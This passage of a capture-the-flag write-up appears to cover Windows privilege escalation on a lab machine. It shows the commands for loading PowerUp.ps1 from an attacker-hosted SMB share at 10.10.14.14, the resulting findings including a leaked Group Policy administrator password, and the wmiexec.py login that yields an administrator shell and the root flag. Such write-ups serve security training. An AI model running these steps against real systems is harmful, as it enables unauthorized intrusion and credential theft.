To escalate further, I leveraged `PowerUp.ps1` from PowerSploit. I copied it to the SMB share:

```bash
cp /opt/PowerSploit/Privesc/PowerUp.ps1 smb/

```

Back on the target box:

```powershell
powershell
cd $env:temp
xcopy \\\\10.10.14.14\\a\\PowerUp.ps1 .
. .\\PowerUp.ps1
Invoke-AllChecks

```

#### Key Findings from PowerUp:

1. **SeImpersonatePrivilege** is enabled (useful for Potato exploits).
2. **Modifiable Service**: `UsoSvc` → vulnerable to service abuse.
3. **Writable path in %PATH%** → DLL hijacking possible.
4. **GPP Password Leak** found!

```
C:\\ProgramData\\Microsoft\\Group Policy\\History\\...\\Groups.xml
Username: Administrator
Password: MyUnclesAreMarioAndLuigi!!1!

```

***

#### Step 5: Full Administrator Access

With valid admin credentials now in hand, I used `wmiexec.py` for a semi-interactive SYSTEM shell:

```bash
wmiexec.py 'administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125'

```

Inside the shell:

```bash
C:\\> whoami
querier\\administrator

```

***

#### Final Flag: Root

```bash
C:\\Users\\Administrator\\Desktop> type root.txt
b19c3794...

```

Mission complete. Root access achieved on the target box.

<figure><img src="../../../../.gitbook/assets/complete (18).gif" alt=""><figcaption></figcaption></figure>
